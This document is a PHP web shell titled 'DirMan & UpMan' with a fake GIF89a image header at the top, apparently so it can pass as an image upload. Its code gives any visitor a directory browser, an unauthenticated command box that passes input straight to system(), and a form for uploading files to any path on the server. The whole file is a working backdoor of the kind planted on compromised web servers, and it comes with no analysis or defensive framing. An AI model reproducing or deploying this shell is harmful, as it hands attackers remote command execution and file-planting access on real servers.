GIF89a  �  �����!�   ,       ��i ������ۼ���H��Q  ;<head><title>DirMan & UpMan</title></head>
<body>
<?
if ($kind == "dir") {
  if (isset($work_dir)) chdir($work_dir);
  else {
    chdir("/");
    $work_dir = "/";
  }
?>
<form name="myform" action="<? echo $PHP_SELF ?>" method="post">
<p>Current working directory:<b>
<?
  $work_dir_splitted = explode("/", substr($work_dir, 1));
  echo "<a href=$PHP_SELF?work_dir=".urlencode("/").">Root</a>/";
  if ($work_dir_splitted[0] == "") $work_dir = "/";
  else {
    for ($i = 0; $i < count($work_dir_splitted); $i++) {
      $url .= "/".$work_dir_splitted[$i];
      echo "<a href='$PHP_SELF?work_dir=".urlencode($url)."'>$work_dir_splitted[$i]</a>/";
    }
  }
?></b><br>Choose new working directory:<br>
<select name="work_dir" onChange="this.form.submit()">
<?
  $dir_handle = opendir($work_dir);
  while ($dir = readdir($dir_handle))
    if (is_dir($dir))
      if ($dir == ".") echo "<option value='$work_dir' selected>Current Directory</option>\n";
      elseif ($dir == "..") {
        if (strrpos($work_dir, "/") == 0) echo "<option value='/'>Parent Directory</option>\n";
        else echo "<option value='".strrev(substr(strstr(strrev($work_dir), "/"), 1))."'>Parent Directory</option>\n";
      } elseif ($work_dir == "/") echo "<option value='/$dir'>$dir</option>\n";
      else echo "<option value='$work_dir/$dir'>$dir</option>\n";
  closedir($dir_handle);
?>
</select><br>Command:<br>
<input type="text" name="command" size="56" <? if ($command) echo "value='$command'" ?>><input name="submit_btn" type="submit" value="Execute Command"><input name="kind" type="hidden" value="dir">
<br>Output:<br><textarea cols="80" rows="25" readonly><? if ($command) system($command); ?></textarea></p>
<?
} else if ($kind == "up") {
  if ($upok == "ok") {
	if (is_uploaded_file($userfile)) {
		$destpath .= "/".$userfile_name;
		if (file_exists($destpath)) {
			echo "<script language='javascript'>alert('1.');</script>";
			exit;
		}
		if (move_uploaded_file($userfile, $destpath)) echo "<script language='javascript'>alert('[$userfile_name] ok up.');</script>";
	}
	else echo "<script language='javascript'>error up.');</script>";
	exit;
  } else {
?>
<form name="myform" ENCTYPE="multipart/form-data" action="<? echo $PHP_SELF ?>" method="post">
<input type=file name=userfile size=80 style="height:20;">
<input type=text name=destpath size=80 style="height:20;">
<input name="kind" type="hidden" value="up"><input name="upok" type="hidden" value="ok">
<input type=submit name=submit>
<?
  }
} ?>
</form>
</body>
</html>